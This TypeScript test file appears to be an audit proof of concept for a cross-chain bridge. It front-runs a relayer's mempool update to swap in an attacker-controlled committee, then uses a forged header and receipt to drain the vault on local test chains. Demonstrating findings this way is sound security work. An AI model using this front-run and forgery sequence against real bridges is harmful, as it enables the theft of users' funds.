import { beforeEach, describe, expect, it } from 'vitest'
import { roles } from '../src/accounts.js'
import { artifacts } from '../src/artifacts.js'
import { fundedDeposit, tokenBalance, withdraw } from '../src/bridge.js'
import { chainA, chainB, rpcRequest } from '../src/chains.js'
import { createCommittee } from '../src/committee.js'
import { DEPOSIT_INITIATED_TOPIC, ZERO_HASH } from '../src/constants.js'
import { deployFreshBridge, type BridgeDeployment } from '../src/deploy.js'
import { encodeHeader, hashHeader, type RpcBlockHeader } from '../src/header.js'
import { proveDeposit } from '../src/prover/guest.js'
import type { DepositWitness } from '../src/prover/witness.js'
import { computeReceiptsRoot, encodeReceipt, type ConsensusReceipt } from '../src/receipts.js'
import { buildUpdate, decodeUpdateCalldata, submitUpdate, type UpdateArguments } from '../src/relayer.js'
import { encodeAbiParameters, pad, type Hex } from 'viem'

let bridge: BridgeDeployment

beforeEach(async () => {
  bridge = await deployFreshBridge()
  await chainB.testClient.setAutomine(true)
})

const readPendingTransaction = async (rpcUrl: string, from: string): Promise<{ input: Hex }> => {
  const content = (await rpcRequest(rpcUrl, 'txpool_content')) as {
    pending: Record<string, Record<string, { input: Hex }>>
  }
  const bySender = content.pending[from.toLowerCase()]
  if (!bySender) throw new Error(`No pending transaction from ${from} in the mempool`)
  const [transaction] = Object.values(bySender)
  if (!transaction) throw new Error('Mempool entry for the sender is empty')
  return transaction
}

/**
 * The headline exploit, in two acts.
 *
 * Act 1 — specification claim: `updateSyncState` signs `keccak256(abi.encodePacked(attestedHeader,
 * period))`. `nextCommitteeRoot` is not part of that digest (H-01). An honest relayer submits an
 * update for a new period with an honest `nextCommitteeRoot`. While it sits unmined, an
 * attacker reads it out of the mempool, copies the untouched signatures and Merkle proofs, and
 * resubmits with the attacker's own `nextCommitteeRoot` and a higher priority fee. The
 * attacker's copy lands first, finalizes the period, and the honest update then reverts.
 *
 * Act 2 — with `LightClientSync` on chain B now trusting 512 attacker-held keys, the attacker's
 * committee attests an arbitrary forged header: a header RLP with no real block behind it,
 * whose receipts-root field is the root of a forged receipts trie holding a forged
 * `DepositInitiated` log (emitter set to chain A's real vault address). The reference prover
 * accepts the internally consistent forgery and signs it. The attacker withdraws real liquidity
 * from chain B's vault.
 */
describe('H-01: committee hijack through an unsigned nextCommitteeRoot, then a forged header', () => {
  it('replaces the committee from the mempool and drains the vault with a forged header', async () => {
    // Real liquidity for the attacker to steal, seeded by an honest opposite-direction deposit.
    await fundedDeposit({
      side: bridge.b,
      user: roles.liquidityProvider,
      recipient: roles.liquidityProvider.address,
      amount: 10_000n,
      targetChainId: 1,
    })

    // --- Act 1: mempool front-run of nextCommitteeRoot ---
    await chainB.testClient.setAutomine(false)

    const attestedHeader = await chainA.publicClient.getBlock({ blockTag: 'latest' }).then((block) => block.hash)
    const honestNextCommittee = createCommittee('chainA-rotated-honestly')
    const attackerCommittee = createCommittee('attacker-hijack')

    const honestUpdate = await buildUpdate({
      committee: bridge.committeeA,
      blockHash: attestedHeader,
      period: 2,
      nextCommitteeRoot: honestNextCommittee.root,
    })
    const honestHash = await submitUpdate({
      destination: chainB,
      lightClient: bridge.b.lightClient,
      account: roles.honestRelayer,
      update: honestUpdate,
      fees: { maxFeePerGas: 2_000_000_000n, maxPriorityFeePerGas: 1_000_000_000n },
      gas: 8_000_000n,
    })

    // The attacker reads the pending transaction straight out of the mempool and decodes it.
    const pending = await readPendingTransaction(chainB.rpcUrl, roles.honestRelayer.address)
    const copiedUpdate: UpdateArguments = decodeUpdateCalldata(pending.input)
    expect(copiedUpdate.attestedHeader).toBe(attestedHeader)

    const attackerUpdate: UpdateArguments = { ...copiedUpdate, nextCommitteeRoot: attackerCommittee.root }
    const attackerHash = await submitUpdate({
      destination: chainB,
      lightClient: bridge.b.lightClient,
      account: roles.attacker,
      update: attackerUpdate,
      fees: { maxFeePerGas: 20_000_000_000n, maxPriorityFeePerGas: 10_000_000_000n },
      gas: 8_000_000n,
    })

    await chainB.testClient.mine({ blocks: 1 })
    await chainB.testClient.setAutomine(true)

    const attackerReceipt = await chainB.publicClient.waitForTransactionReceipt({ hash: attackerHash })
    const honestReceipt = await chainB.publicClient.waitForTransactionReceipt({ hash: honestHash })
    expect(attackerReceipt.status).toBe('success')
    expect(honestReceipt.status).toBe('reverted')
    // The attacker's transaction was mined first in the same block.
    expect(attackerReceipt.transactionIndex).toBeLessThan(honestReceipt.transactionIndex)

    const hijackedRoot = await chainB.publicClient.readContract({
      address: bridge.b.lightClient,
      abi: artifacts.lightClient().abi,
      functionName: 'currentCommitteeRoot',
    })
    expect(hijackedRoot).toBe(attackerCommittee.root)
    expect(hijackedRoot).not.toBe(honestNextCommittee.root)

    // --- Act 2: the hijacked committee attests a forged header ---
    const forgedLog = {
      address: bridge.a.vault,
      topics: [
        DEPOSIT_INITIATED_TOPIC,
        pad(bridge.a.token),
        pad(roles.attacker.address),
        pad(roles.attacker.address),
      ] as const,
      data: encodeAbiParameters(
        [
          { name: 'amount', type: 'uint256' },
          { name: 'nonce', type: 'bytes32' },
          { name: 'targetChainId', type: 'uint64' },
        ],
        [10_000n, `0x${'cd'.repeat(32)}` as Hex, 369n],
      ),
    }
    const forgedReceipt: ConsensusReceipt = {
      type: 2,
      status: true,
      cumulativeGasUsed: 21_000n,
      logsBloom: `0x${'00'.repeat(256)}` as Hex,
      logs: [forgedLog],
    }
    const encodedForgedReceipt = encodeReceipt(forgedReceipt)

    const forgedReceiptsRoot = await computeReceiptsRoot([encodedForgedReceipt])
    const forgedHeader: RpcBlockHeader = {
      hash: ZERO_HASH,
      parentHash: `0x${'11'.repeat(32)}`,
      sha3Uncles: `0x${'00'.repeat(32)}`,
      miner: '0x0000000000000000000000000000000000000000',
      stateRoot: `0x${'22'.repeat(32)}`,
      transactionsRoot: `0x${'33'.repeat(32)}`,
      receiptsRoot: forgedReceiptsRoot,
      logsBloom: `0x${'00'.repeat(256)}`,
      difficulty: '0x0',
      number: '0x999999',
      gasLimit: '0x1c9c380',
      gasUsed: '0x5208',
      timestamp: `0x${Math.floor(Date.now() / 1000).toString(16)}`,
      extraData: '0x',
      mixHash: `0x${'44'.repeat(32)}`,
      nonce: '0x0000000000000000',
      baseFeePerGas: '0x3b9aca00',
      withdrawalsRoot: `0x${'00'.repeat(32)}`,
      blobGasUsed: '0x0',
      excessBlobGas: '0x0',
      parentBeaconBlockRoot: `0x${'00'.repeat(32)}`,
      requestsHash: `0x${'00'.repeat(32)}`,
    }
    const forgedHeaderRlp = encodeHeader(forgedHeader)
    const forgedBlockRoot = hashHeader(forgedHeaderRlp)

    const forgedWitness: DepositWitness = {
      headerRlp: forgedHeaderRlp,
      receipts: [encodedForgedReceipt],
      txIndex: 0,
      logIndex: 0,
    }
    // No real chain holds this block: the circuit only checks internal consistency (H-05).
    const forgedProof = await proveDeposit(forgedWitness, 1)
    expect(forgedProof.inputs.confirmedBlockRoot).toBe(forgedBlockRoot)

    const forgeUpdate = await buildUpdate({
      committee: attackerCommittee,
      blockHash: forgedBlockRoot,
      period: 3,
    })
    const forgeHash = await submitUpdate({
      destination: chainB,
      lightClient: bridge.b.lightClient,
      account: roles.attacker,
      update: forgeUpdate,
    })
    await chainB.publicClient.waitForTransactionReceipt({ hash: forgeHash })

    const balanceBefore = await tokenBalance(bridge.b, bridge.b.token, roles.attacker.address)
    await withdraw({ side: bridge.b, caller: roles.attacker, proof: forgedProof })
    const balanceAfter = await tokenBalance(bridge.b, bridge.b.token, roles.attacker.address)
    expect(balanceAfter - balanceBefore).toBe(10_000n)
  })
})
